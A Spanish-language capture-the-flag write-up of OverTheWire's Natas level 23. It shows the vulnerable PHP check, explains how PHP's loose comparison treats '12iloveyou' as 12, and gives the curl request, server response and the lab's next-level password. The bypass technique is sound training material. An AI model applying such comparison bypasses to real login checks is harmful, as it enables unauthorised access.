# Natas23

#### URL: http://natas23.natas.labs.overthewire.org
#### Credenciales: natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs 

``` php
 if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
```

El parametro passwd debe contener una cadena que contenga a la subcadena "iloveyou" y la extension de la cadena debe ser mayor a 10. Ojo con esto, `no se esta usando strlen para obtener la longitud de la cadena, se esta pasando el string mismo como argumento`.

En estos casos el operador de desigualdad se comporta de la siguiente manera:
- El string devolvera 0 si su primer caracter no es un numero o el numero por el que comienza(ej: 91test > 5 se evalua como 91 > 5)

``` bash
curl -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs http://natas23.natas.labs.overthewire.org/?passwd=12iloveyou 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

`natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`

